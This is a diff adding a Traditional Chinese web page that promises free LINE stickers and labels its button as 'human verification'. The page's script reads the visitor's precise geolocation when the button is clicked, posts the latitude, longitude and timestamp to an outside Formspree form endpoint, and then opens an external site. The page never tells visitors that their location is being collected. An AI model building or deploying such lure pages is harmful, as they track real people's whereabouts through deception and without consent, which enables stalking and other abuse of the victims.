@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="zh-Hant">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>獲取專屬貼圖</title>
+  <style>
+    body {
+      font-family: "Noto Sans TC", sans-serif;
+      max-width: 500px;
+      margin: 50px auto;
+      padding: 20px;
+      background-color: #f9f9f9;
+      text-align: center;
+    }
+    button {
+      background-color: #7289da;
+      border: none;
+      color: white;
+      padding: 15px 25px;
+      font-size: 1.2em;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+    button:hover {
+      background-color: #5b6eae;
+    }
+    #status {
+      margin-top: 20px;
+      color: #333;
+      font-weight: 600;
+    }
+  </style>
+</head>
+<body>
+  <nav>
+    <a href="index.html">首頁</a>
+  </nav>
+  
+  <h1>點擊按鈕獲取賴貼圖</h1>
+  <button id="sendLocationBtn">獲得真人驗證 驗證完後將轉到獲取貼圖網站</button>
+  <div id="status">等待回應</div>
+
+  <script>
+    const btn = document.getElementById('sendLocationBtn');
+    const status = document.getElementById('status');
+
+    btn.addEventListener('click', () => {
+      if (!navigator.geolocation) {
+        status.textContent = "瀏覽器不支援定位功能";
+        return;
+      }
+
+      status.textContent = "取得中...請稍候";
+
+      navigator.geolocation.getCurrentPosition(async (position) => {
+        const data = {
+          latitude: position.coords.latitude,
+          longitude: position.coords.longitude,
+          timestamp: new Date().toISOString()
+        };
+
+        try {
+          const response = await fetch('https://formspree.io/f/xnndkpja', {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+              'Accept': 'application/json'
+            },
+            body: JSON.stringify(data)
+          });
+
+          if (response.ok) {
+            status.textContent = "已送出請求";
+            // 送出成功後開啟你的專屬網址
+            window.open('https://1moz.org/', '_blank');
+          } else {
+            status.textContent = "送出失敗，請稍後再試。";
+          }
+        } catch (err) {
+          status.textContent = "送出過程發生錯誤：" + err.message;
+        }
+      }, (error) => {
+        status.textContent = "無法取得驗證：" + error.message;
+      });
+    });
+  </script>
+
+</body>
+</html>
